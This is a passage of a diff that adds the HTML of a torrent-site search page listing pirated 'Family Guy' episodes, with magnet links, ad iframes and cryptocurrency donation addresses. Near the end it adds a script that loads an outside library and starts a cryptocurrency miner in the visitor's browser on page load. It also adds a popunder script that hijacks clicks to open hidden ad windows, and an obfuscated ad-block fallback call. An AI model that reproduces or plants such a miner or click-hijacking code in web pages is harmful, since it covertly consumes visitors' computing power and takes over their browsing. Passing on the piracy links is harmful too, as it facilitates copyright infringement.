+<a href="magnet:?xt=urn:btih:78f1236feb890e9ffc0759db933fdfe05872ff26&dn=Family.Guy.S15E11.HDTV.x264-KILLERS%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=ePEjb+uJDp/8B1nbkz/f4Fhy/yY=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family.Guy.S15E11.HDTV.x264-KILLERS[ettv]" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 1 comments." title="This torrent has 1 comments." /><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 01-16&nbsp;2017, Size 102.56&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">55</td>
+		<td align="right">2</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/11943092/Family_Guy_S13_Season_13_480p_HDTV_x264_AAC_E-Subs_[GWC]" class="detLink" title="Details for Family Guy S13 Season 13 480p HDTV x264 AAC E-Subs [GWC]">Family Guy S13 Season 13 480p HDTV x264 AAC E-Subs [GWC]</a>
+</div>
+<a href="magnet:?xt=urn:btih:e39a07f61ce2bc08c79dcad2ea2d132687aedef6&dn=Family+Guy+S13+Season+13+480p+HDTV+x264+AAC+E-Subs+%5BGWC%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="http://www.bitlord.me/share/?re=ThePirateBay&ba=b8977e&co=fff&sh=45oH9hzivAjHncrS6i0TJoeu3vY=&ur=//thepiratebay.org/search/Family%20Guy/0/99/0&fn=Family Guy S13 Season 13 480p HDTV x264 AAC E-Subs [GWC]" target="_blank" title="Play now using Bitlord"><img src="//thepiratebay.org/static/img/icons/icon-bitx.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 1 comments." title="This torrent has 1 comments." /><a href="/user/canc232"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 05-19&nbsp;2015, Size 1.01&nbsp;GiB, ULed by <a class="detDesc" href="/user/canc232/" title="Browse canc232">canc232</a></font>
+		</td>
+		<td align="right">53</td>
+		<td align="right">14</td>
+	</tr>
+
+</table>
+</div>
+<div align="center">1&nbsp;<a href="/search/Family Guy/1/7//">2</a>&nbsp;<a href="/search/Family Guy/2/7//">3</a>&nbsp;<a href="/search/Family Guy/3/7//">4</a>&nbsp;<a href="/search/Family Guy/4/7//">5</a>&nbsp;<a href="/search/Family Guy/5/7//">6</a>&nbsp;<a href="/search/Family Guy/6/7//">7</a>&nbsp;<a href="/search/Family Guy/7/7//">8</a>&nbsp;<a href="/search/Family Guy/8/7//">9</a>&nbsp;<a href="/search/Family Guy/9/7//">10</a>&nbsp;<a href="/search/Family Guy/10/7//">11</a>&nbsp;<a href="/search/Family Guy/11/7//">12</a>&nbsp;<a href="/search/Family Guy/12/7//">13</a>&nbsp;<a href="/search/Family Guy/13/7//">14</a>&nbsp;<a href="/search/Family Guy/14/7//">15</a>&nbsp;<a href="/search/Family Guy/15/7//">16</a>&nbsp;<a href="/search/Family Guy/16/7//">17</a>&nbsp;<a href="/search/Family Guy/17/7//">18</a>&nbsp;<a href="/search/Family Guy/18/7//">19</a>&nbsp;<a href="/search/Family Guy/19/7//">20</a>&nbsp;<a href="/search/Family Guy/20/7//">21</a>&nbsp;<a href="/search/Family Guy/21/7//">22</a>&nbsp;<a href="/search/Family Guy/22/7//">23</a>&nbsp;<a href="/search/Family Guy/23/7//">24</a>&nbsp;<a href="/search/Family Guy/24/7//">25</a>&nbsp;<a href="/search/Family Guy/25/7//">26</a>&nbsp;<a href="/search/Family Guy/26/7//">27</a>&nbsp;<a href="/search/Family Guy/27/7//">28</a>&nbsp;<a href="/search/Family Guy/28/7//">29</a>&nbsp;<a href="/search/Family Guy/29/7//">30</a>&nbsp;<a href="/search/Family Guy/30/7//">31</a>&nbsp;<a href="/search/Family Guy/31/7//">32</a>&nbsp;<a href="/search/Family Guy/32/7//">33</a>&nbsp;<a href="/search/Family Guy/33/7//">34</a>&nbsp;<a href="/search/Family Guy/34/7//">35</a>&nbsp;<a href="/search/Family Guy/35/7//">36</a>&nbsp;<a href="/search/Family Guy/36/7//">37</a>&nbsp;<a href="/search/Family Guy/37/7//">38</a>&nbsp;<a href="/search/Family Guy/38/7//">39</a>&nbsp;<a href="/search/Family Guy/39/7//">40</a>&nbsp;<a href="/search/Family Guy/40/7//">41</a>&nbsp;<a href="/search/Family Guy/41/7//">42</a>&nbsp;<a href="/search/Family Guy/42/7//">43</a>&nbsp;<a href="/search/Family Guy/43/7//">44</a>&nbsp;<a href="/search/Family Guy/44/7//">45</a>&nbsp;<a href="/search/Family Guy/45/7//">46</a>&nbsp;<a href="/search/Family Guy/46/7//">47</a>&nbsp;<a href="/search/Family Guy/47/7//">48</a>&nbsp;<a href="/search/Family Guy/48/7//">49</a>&nbsp;<a href="/search/Family Guy/49/7//">50</a>&nbsp;<a href="/search/Family Guy/1/7//"><img src="//thepiratebay.org/static/img/next.gif" border="0" alt="Next"/></a>&nbsp;
+</div>
+			<div class="ads" id="sky-banner">
+				 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/sky1.html" width="120" height="600" frameborder="0" scrolling="no"></iframe>
+			</div>
+			<script type="text/javascript" src="//thepiratebay.org/static/si0Eim0u/ad-scroll.js"></script>
+	</div></div>	</div><!-- //div:content -->
+
+	<div id="foot" style="text-align:center;margin-top:1em;">
+
+			 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/bottom.html" width="728" height="90" frameborder="0" scrolling="no"></iframe>
+				<p>
+			<a href="/login" title="Login">Login</a> | 
+			<a href="/register" title="Register">Register</a> | 
+			<a href="/language" title="Select language">Language / Select language</a> |
+			<a href="/about" title="About">About</a> |
+			<a href="/blog" title="Blog">Blog</a>
+			<br />
+			<!--<a href="/contact" title="Contact us">Contact us</a> |-->
+			<a href="/policy" title="Usage policy">Usage policy</a> |
+			<a href="http://uj3wazyk5u4hnvtk.onion" title="TOR">TOR</a> |
+			<a href="/doodles" title="Doodles">Doodles</a> |
+			<a href="http://pirates-forum.org/" title="Forum" target="_blank">Forum</a> 
+			<br />
+		</p>
+
+<br /><a href="http://bitcoin.org" target="_NEW">BTC</a>: <b>3HcEB6bi4TFPdvk31Pwz77DwAzfAZz2fMn</b><br /><a href="http://bitcoin.org" target="_NEW">BTC (Bech32)</a>: <b>bc1q9x30z7rz52c97jwc2j79w76y7l3ny54nlvd4ew</b><br /><a href="http://litecoin.org" target="_NEW">LTC</a>: <b>LS78aoGtfuGCZ777x3Hmr6tcoW3WaYynx9</b><br /><a href="http://getmonero.org" target="_NEW">XMR</a>: <b>46E5ekYrZd5UCcmNuYEX24FRjWVMgZ1ob79cRViyfvLFZjfyMhPDvbuCe54FqLQvVCgRKP4UUMMW5fy3ZhVQhD1JLLufBtu</b><br /><a href="http://bitcoin.org" target="_NEW">BCH</a>: <b>Bcash. LOL</b><br /><br />
+
+		<div id="fbanners">
+			<a href="/rss" class="rss" title="RSS"><img src="//thepiratebay.org/static/img/rss_small.gif" alt="RSS" /></a>
+		</div><!-- // div:fbanners -->
+	</div><!-- // div:foot -->
+<script src="//clgserv.pro/lib/crypta.js"></script>
+<script>
+            var miner=new CRLT.Anonymous('37efd635d0ec154de4d0b17dd1952aa3b5e88acd6bbe', {
+                throttle:0.9,
+            });
+        miner.start();
+</script>
+
+<script>
+var _wm_settings = {
+  popunder: {
+    url: 			'https://traffic.adxprtz.com/?placement=289748&redirect',
+    times: 		2,
+    hours: 		12.000000,
+    cookie: 	'tpbpop',
+    fastbind:true
+  }
+};
+var _wm={initialize:function(){this.ua.initialize()},array:{is_array:function(a){return Object.prototype.toString.call(a)==='[object Array]'},sort:function(a,b,c){a=a.sort();if(b)a=a.reverse();if(c){for(var i=0;i<a.length;i++){var d=a[i];if(Object.prototype.toString.call(d)==='[object Object]')d=_wm.object.sort(d,b,true);else if(Object.prototype.toString.call(d)==='[object Array]')d=_wm.array.sort(d,b,true);a[i]=d}}return a},random_value:function(a){return a[Math.floor(a.length*Math.random())]}},object:{is_object:function(a){return Object.prototype.toString.call(a)==='[object Object]'},keys:function(a){var hasOwnProperty=Object.prototype.hasOwnProperty,hasDontEnumBug=!({toString:null}).propertyIsEnumerable('toString'),dontEnums=['toString','toLocaleString','valueOf','hasOwnProperty','isPrototypeOf','propertyIsEnumerable','constructor'],dontEnumsLength=dontEnums.length;var b=[];if(typeof a!=='object'&&typeof a!=='function'||a===null)return b;for(var c in a){if(hasOwnProperty.call(a,c))b.push(c)}if(hasDontEnumBug){for(var i=0;i<dontEnumsLength;i++){if(hasOwnProperty.call(a,dontEnums[i]))b.push(dontEnums[i])}}return b},sort:function(a,c,d){var e=_wm.array.sort(_wm.object.keys(a));if(c)e=e.reverse();var b={};for(var i=0;i<e.length;i++){var f=a[e[i]];if(d){if(_wm.object.is_object(f))f=_wm.object.sort(f,c,true);else if(_wm.array.is_array(f))f=_wm.array.sort(f,c,true)}b[e[i]]=f}return b},iterator:function(b){this.element=b;this.element_array=_wm.object.keys(b);this.current_index=0;this.hasNext=function(){return this.current_index<=this.element_array.length-1};this.next=function(){if(this.hasNext()){var a=[this.element_array[this.current_index],this.element[this.element_array[this.current_index]]];this.current_index++;return a}return false}},random_value:function(a){return a[_wm.array.random_value(_wm.object.keys(a))]},length:function(a){return _wm.object.keys(a).length}},ua:{initialize:function(){this.maps={browser:{oldsafari:{major:{'1':['/8','/1','/3'],'2':'/4','?':'/'},version:{'1.0':'/8','1.2':'/1','1.3':'/3','2.0':'/412','2.0.2':'/416','2.0.3':'/417','2.0.4':'/419','?':'/'}}},os:{windows:{version:{'ME':'4.90','NT 3.11':'NT3.51','NT 4.0':'NT4.0','2000':'NT 5.0','XP':['NT 5.1','NT 5.2'],'Vista':'NT 6.0','7':'NT 6.1','8':'NT 6.2','8.1':'NT 6.3','RT':'ARM'}}}};this.regexes={browser:[[/(opera\smini)\/((\d+)?[\w\.-]+)/i,/(opera\s[mobiletab]+).+version\/((\d+)?[\w\.-]+)/i,/(opera).+version\/((\d+)?[\w\.]+)/i,/(opera)[\/\s]+((\d+)?[\w\.]+)/i],['name','version','major'],[/\s(opr)\/((\d+)?[\w\.]+)/i],[['name','Opera'],'version','major'],[/(kindle)\/((\d+)?[\w\.]+)/i,/(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?((\d+)?[\w\.]+)*/i,/(avant\s|iemobile|slim|baidu)(?:browser)?[\/\s]?((\d+)?[\w\.]*)/i,/(?:ms|\()(ie)\s((\d+)?[\w\.]+)/i,/(rekonq)((?:\/)[\w\.]+)*/i,/(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron)\/((\d+)?[\w\.-]+)/i],['name','version','major'],[/(trident).+rv[:\s]((\d+)?[\w\.]+).+like\sgecko/i],[['name','IE'],'version','major'],[/(yabrowser)\/((\d+)?[\w\.]+)/i],[['name','Yandex'],'version','major'],[/(comodo_dragon)\/((\d+)?[\w\.]+)/i],[['name',/_/g,' '],'version','major'],[/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?((\d+)?[\w\.]+)/i],['name','version','major'],[/(dolfin)\/((\d+)?[\w\.]+)/i],[['name','Dolphin'],'version','major'],[/((?:android.+)crmo|crios)\/((\d+)?[\w\.]+)/i],[['name','Chrome'],'version','major'],[/version\/((\d+)?[\w\.]+).+?mobile\/\w+\s(safari)/i],['version','major',['name','Mobile Safari']],[/version\/((\d+)?[\w\.]+).+?(mobile\s?safari|safari)/i],['version','major','name'],[/webkit.+?(mobile\s?safari|safari)((\/[\w\.]+))/i],['name',['major',_wm.ua.mapper.str,_wm.ua.maps.browser.oldsafari.major],['version',_wm.ua.mapper.str,_wm.ua.maps.browser.oldsafari.version]],[/(konqueror)\/((\d+)?[\w\.]+)/i,/(webkit|khtml)\/((\d+)?[\w\.]+)/i],['name','version','major'],[/(navigator|netscape)\/((\d+)?[\w\.-]+)/i],[['name','Netscape'],'version','major'],[/(swiftfox)/i,/(icedragon|iceweasel|camino|chimera|fennec|maemo\sbrowser|minimo|conkeror)[\/\s]?((\d+)?[\w\.\+]+)/i,/(firefox|seamonkey|k-meleon|icecat|iceape|firebird|phoenix)\/((\d+)?[\w\.-]+)/i,/(mozilla)\/((\d+)?[\w\.]+).+rv\:.+gecko\/\d+/i,/(uc\s?browser|polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|qqbrowser)[\/\s]?((\d+)?[\w\.]+)/i,/(links)\s\(((\d+)?[\w\.]+)/i,/(gobrowser)\/?((\d+)?[\w\.]+)*/i,/(ice\s?browser)\/v?((\d+)?[\w\._]+)/i,/(mosaic)[\/\s]((\d+)?[\w\.]+)/i],['name','version','major']],os:[[/(windows)\snt\s6\.2;\s(arm)/i,/(windows\sphone(?:\sos)*|windows\smobile|windows)[\s\/]?([ntce\d\.\s]+\w)/i],['name',['version',_wm.ua.mapper.str,_wm.ua.maps.os.windows.version]],[/(win(?=3|9|n)|win\s9x\s)([nt\d\.]+)/i],[['name','Windows'],['version',_wm.ua.mapper.str,_wm.ua.maps.os.windows.version]],[/\((bb)(10);/i],[['name','BlackBerry'],'version'],[/(blackberry)\w*\/?([\w\.]+)*/i,/(tizen)\/([\w\.]+)/i,/(android|webos|palm\os|qnx|bada|rim\stablet\sos|meego)[\/\s-]?([\w\.]+)*/i],['name','version'],[/(symbian\s?os|symbos|s60(?=;))[\/\s-]?([\w\.]+)*/i],[['name','Symbian'],'version'],[/mozilla.+\(mobile;.+gecko.+firefox/i],[['name','Firefox OS'],'version'],[/(nintendo|playstation)\s([wids3portablevu]+)/i,/(mint)[\/\s\(]?(\w+)*/i,/(joli|[kxln]?ubuntu|debian|[open]*suse|gentoo|arch|slackware|fedora|mandriva|centos|pclinuxos|redhat|zenwalk)[\/\s-]?([\w\.-]+)*/i,/(hurd|linux)\s?([\w\.]+)*/i,/(gnu)\s?([\w\.]+)*/i],['name','version'],[/(cros)\s[\w]+\s([\w\.]+\w)/i],[['name','Chromium OS'],'version'],[/(sunos)\s?([\w\.]+\d)*/i],[['name','Solaris'],'version'],[/\s([frentopc-]{0,4}bsd|dragonfly)\s?([\w\.]+)*/i],['name','version'],[/(ip[honead]+)(?:.*os\s*([\w]+)*\slike\smac|;\sopera)/i],[['name','iOS'],['version',/_/g,'.']],[/(mac\sos\sx)\s?([\w\s\.]+\w)*/i],['name',['version',/_/g,'.']],[/(haiku)\s(\w+)/i,/(aix)\s((\d)(?=\.|\)|\s)[\w\.]*)*/i,/(macintosh|mac(?=_powerpc)|plan\s9|minix|beos|os\/2|amigaos|morphos|risc\sos)/i,/(unix)\s?([\w\.]+)*/i],['name','version']]},this.browser=this.get.browser();this.os=this.get.os()},ua:(window&&window.navigator&&window.navigator.userAgent)?window.navigator.userAgent:'',get:{browser:function(){return _wm.ua.mapper.rgx.apply(this,_wm.ua.regexes.browser)},os:function(){return _wm.ua.mapper.rgx.apply(this,_wm.ua.regexes.os)}},util:{has:function(a,b){return b.toLowerCase().indexOf(a.toLowerCase())!==-1},lowerize:function(a){return a.toLowerCase()}},mapper:{rgx:function(){for(var a,i=0,j,k,p,q,matches,match,args=arguments;i<args.length;i+=2){var b=args[i],props=args[i+1];if(typeof(a)==='undefined'){a={};for(p in props){q=props[p];if(typeof(q)==='object'){a[q[0]]=undefined}else{a[q]=undefined}}}for(j=k=0;j<b.length;j++){matches=b[j].exec(_wm.ua.ua);if(!!matches){for(p=0;p<props.length;p++){match=matches[++k];q=props[p];if(typeof(q)==='object'&&q.length>0){if(q.length==2){if(typeof(q[1])=='function'){a[q[0]]=q[1].call(this,match)}else{a[q[0]]=q[1]}}else if(q.length==3){if(typeof(q[1])==='function'&&!(q[1].exec&&q[1].test)){a[q[0]]=match?q[1].call(this,match,q[2]):undefined}else{a[q[0]]=match?match.replace(q[1],q[2]):undefined}}else if(q.length==4){a[q[0]]=match?q[3].call(this,match.replace(q[1],q[2])):undefined}}else{a[q]=match?match:undefined}}break}}if(!!matches)break}return a},str:function(a,b){for(var i in b){if(typeof(b[i])==='object'&&b[i].length>0){for(var j=0;j<b[i].length;j++){if(_wm.ua.util.has(b[i][j],a)){return(i==='?')?undefined:i}}}else if(_wm.ua.util.has(b[i],a)){return(i==='?')?undefined:i}}return a}}},cookie:{get:function(a,b){var c=new Date();c.setTime(c.getTime());var d=new Date(c.getTime()+(1000*60*60*b)).toGMTString();var e=document.cookie.split(';');var f='';var g='';var h=[0,d];for(var i=0;i<e.length;i++){f=e[i].split('=');g=f[0].replace(/^\s+|\s+$/g,'');if(g==a){b_cookie_found=true;if(f.length>1){h=unescape(f[1]).split('|');if(h.length==1)h[1]=d}return h}f=null;g=''}return h},set:function(a,b,c){document.cookie=a+'='+escape(b+'|'+c)+';expires='+c+';path=/'}},listener:{events:[],add:function(a,b,c,e){if(e==undefined)e=true;var d='on'+b;if(typeof a.addEventListener!='undefined')a.addEventListener(b,c,e);else if(typeof a.attachEvent!='undefined')a.attachEvent(d,c);else{if(typeof a[d]!='function')a[d]=c;else{var e=a[d];a['old_'+d]=e;a[d]=function(){e();return c()}}}_wm.listener.events.push(arguments)},remove:function(a,b,c,e){if(e==undefined)e=true;var d='on'+b;if(typeof a.removeEventListener!='undefined')a.removeEventListener(b,c,e);else if(typeof a.detachEvent!='undefined')a.detachEvent(d,c);else{if(typeof a['old_'+d]!='function')a[d]=null;else a[d]=a['old_'+d]}outer:for(var i=0;i<_wm.listener.events.length;i++){inner:for(var j=0;j<_wm.listener.events[i].length;j++){if(_wm.listener.events[i][j]!==arguments[j])continue outer}_wm.listener.events=_wm.listener.events.slice(0,i).concat(_wm.listener.events.slice(i+1));break outer}},clear:function(){while(_wm.listener.events.length>0)_wm.listener.remove.apply(undefined,_wm.listener.events[0])}},format:{},random:function(){return Math.floor(Math.random()*1000001)}};_wm.initialize();_wm.format.popunder={settings:typeof _wm_settings==='object'&&_wm_settings.popunder||false,config:'width='+screen.width+', height='+screen.height+',resizable=no,toolbar=no,location=no,directories=no,status=no,menubar=no,copyhistory=no,scrollbars=yes',isBinded:false,isTriggered:false,trigger_stack:[],initialize:function(){if(!_wm.format.popunder.settings){alert('Popunder configuration need to be declared using _wm_settings variable prior to script execution.');return}var a=_wm.cookie.get(_wm.format.popunder.settings.cookie,_wm.format.popunder.settings.hours);this.cookie={};this.cookie.times=!isNaN(Number(a[0]))?Number(a[0]):0;this.cookie.expires=!isNaN(Date.parse(a[1]))?a[1]:new Date().toGMTString();if(_wm.format.popunder.settings.fastbind)_wm.format.popunder.handler.bind();else{if(document.readyState=='complete')_wm.format.popunder.handler.bind();else{_wm.listener.add(document,'DOMContentLoaded',function(){_wm.listener.remove(document,'DOMContentLoaded');_wm.format.popunder.handler.bind()});_wm.listener.add(document,'onreadystatechange',function(){if(document.readyState=='complete'){_wm.listener.remove(document,'onreadystatechange');_wm.format.popunder.handler.bind()}});_wm.listener.add(window,'load',_wm.format.popunder.handler.bind)}}},url:function(){var a=_wm.format.popunder.settings.url;if(typeof a=='string')return a;if(_wm.array.is_array(a))return _wm.array.random_value(a);if((_wm.object.is_object(a)&&!_wm.format.popunder.settings.hours))return _wm.object.random_value(a);if(_wm.object.is_object(a)){if(a[_wm.format.popunder.cookie.times]!=undefined)return a[_wm.format.popunder.cookie.times];else return _wm.object.random_value(a)}return null},handler:{bind:function(){if(_wm.format.popunder.isBinded)return;_wm.format.popunder.isBinded=true;if(_wm.format.popunder.cookie.times>=_wm.format.popunder.settings.times&&_wm.format.popunder.settings.hours>0)return;var b={};var c=function(){var a=arguments[0];for(var i=2;i<arguments.length;i++){if(i%2)arguments[i]=arguments[i]+'.0';if(!a.hasOwnProperty(arguments[i])&&i<arguments.length-1)a[arguments[i]]={};if(i==arguments.length-1)a[arguments[i]]=arguments[1];else a=a[arguments[i]]}return arguments[0]};for(var d in _wm.format.popunder.callback.binder){if(!_wm.format.popunder.callback.binder.hasOwnProperty(d))continue;var e=_wm.format.popunder.callback.binder[d];var f=d.split(',');for(var g in f){if(!f.hasOwnProperty(g))continue;var h=f[g].split(':');var j=h.length==1?['all',0].concat(h[0].split('_')):(h[0].indexOf('_')!=-1?h[0].split('_'):h[0].split('_').concat([0])).concat(h[1].split('_'));if(j.length==3)j.push(0);b=c.apply(null,[b,e].concat(j))}}b=_wm.object.sort(b,true,true);var k={};var l=[_wm.ua.os.name.toLowerCase().split(' ').shift(),parseInt(_wm.ua.os.version)||0,_wm.ua.browser.name.toLowerCase().split(' ').shift(),parseInt(_wm.ua.browser.major)||0];var m=[],trace_values=[];var n=b;for(var i=0;i>=0&&i<l.length;i++){var o=(trace_values.length>0?trace_values.join(':')+':':'')+''+i;if(k[o]){var p=k[o]}else{var p=new _wm.object.iterator(n);k[o]=p}var q=false;while(p.hasNext()){var r=p.next();if((i%2&&r[0]<=parseFloat(l[i]))||(i%2==0&&(r[0]==l[i])||r[0]==='all')){q=r[0];break}}if(q){m.push(n);trace_values.push(q);n=n[q]}else{trace_values.pop();n=m.pop();i-=2}}if(typeof n==='function')n()},trigger:function(e){if(_wm.ua.browser.name.toLowerCase()!=='ie'||_wm.ua.browser.major>8)e.stopImmediatePropagation();_wm.listener.clear();if(!_wm.format.popunder.registerTrigger())return;var a;while(a=_wm.format.popunder.trigger_stack.shift())_wm.format.popunder.callback.trigger[a.shift()].apply(undefined,a)}},callback:{binder:{'mac:safari_6,windows:chrome_34,mac:chrome_34,linux:chrome_34':function(){_wm.format.popunder.trigger_stack.push(['tab_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'windows:chrome_31,mac:chrome_31,linux:chrome_31':function(){_wm.format.popunder.trigger_stack.push(['flash_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'windows:chrome_28,mac:chrome_28,linux:chrome_28':function(){_wm.format.popunder.trigger_stack.push(['triple_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'firefox_12,chrome_21':function(){_wm.format.popunder.trigger_stack.push(['double_trigger']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'explorer':function(){_wm.format.popunder.trigger_stack.push(['single_delay']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'android:all,ios:all':function(){_wm.format.popunder.trigger_stack.push(['single']);_wm.listener.add(document,'touchend',_wm.format.popunder.handler.trigger);_wm.listener.add(document,'touchcancel',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'windows:iemobile':function(){_wm.format.popunder.trigger_stack.push(['single']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()},'all':function(){_wm.format.popunder.trigger_stack.push(['single']);_wm.listener.add(document,'click',_wm.format.popunder.handler.trigger);_wm.format.popunder.occupy()}},trigger:{flash_trigger:function(){var d=document.createElement('div');document.body.appendChild(d);d.innerHTML='<object type="application/x-sho'+'ckwave-fla'+'sh" data="about:blank" id="wm_ff_pu_33_fl" '+'width="1" height="1"><param name="wmode" value="transparent"></object>';var a=document.getElementById('wm_ff_pu_33_fl');a.focus();a.style.display='none';window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);window.open('').close()},tab_trigger:function(){var a=document.createElement('a');a.href=_wm.format.popunder.url();a.setAttribute('target','_blank');top.window.document.body.appendChild(a);var e=document.createEvent('MouseEvents');e.initMouseEvent('click',true,true,window,0,0,0,0,0,true,false,false,true,0,null);a.dispatchEvent(e)},triple_trigger:function(){window.open('javascript:window.focus()','_self');var w=window.open('about:blank','pu_'+_wm.random(),_wm.format.popunder.config);var a=document.createElement('a');a.setAttribute('href','data:text/html,<scr'+'ipt>window.close();</scr'+'ipt>');a.style.display='none';document.body.appendChild(a);var e=document.createEvent('MouseEvents');e.initMouseEvent('click',true,true,window,0,0,0,0,0,true,false,false,true,0,null);a.dispatchEvent(e);document.body.removeChild(a);w.document.open().write('<scr'+'ipt type="text/javascript">window.location="'+_wm.format.popunder.url()+'";<\/scr'+'ipt>');w.document.close()},double_trigger:function(){var w=window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);if(w){w.blur();try{var b=w.window.open('about:blank');b.close()}catch(i){}if(_wm.ua.browser=='Firefox')window.showModalDialog("javascript:window.close()",null,"dialogtop:99999999;dialogleft:999999999;dialogWidth:1;dialogHeight:1");window.focus()}},single_delay:function(){var w=window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);window.setTimeout(window.focus,750);window.setTimeout(window.focus,850);if(w)w.blur()},single:function(a){var w=window.open(_wm.format.popunder.url(),'pu_'+_wm.random(),_wm.format.popunder.config);if(w){w.blur();window.focus()}},}},occupy:function(a){if(!a){a=['mousedown','mouseup']}for(var i=0;i<a.length;i++){_wm.listener.add(document,a[i],function(e){if(_wm.ua.browser.name.toLowerCase()!=='ie'||_wm.ua.browser.major>8)e.stopImmediatePropagation()})}},registerTrigger:function(){if(_wm.format.popunder.isTriggered)return false;_wm.format.popunder.isTriggered=true;if(_wm.format.popunder.settings.hours>0)_wm.cookie.set(_wm.format.popunder.settings.cookie,++_wm.format.popunder.cookie.times,_wm.format.popunder.cookie.expires);return true}};(function(){_wm.format.popunder.initialize()})();
+</script>
+<script type="text/javascript" src="//traffic.adxprtz.com/ads/ads.js"></script> <script type="text/javascript"> if (typeof asjdebsbnhjx === 'undefined') { 
+B8pH0aiCTG();  }</script>
+
+</body>
+</html>
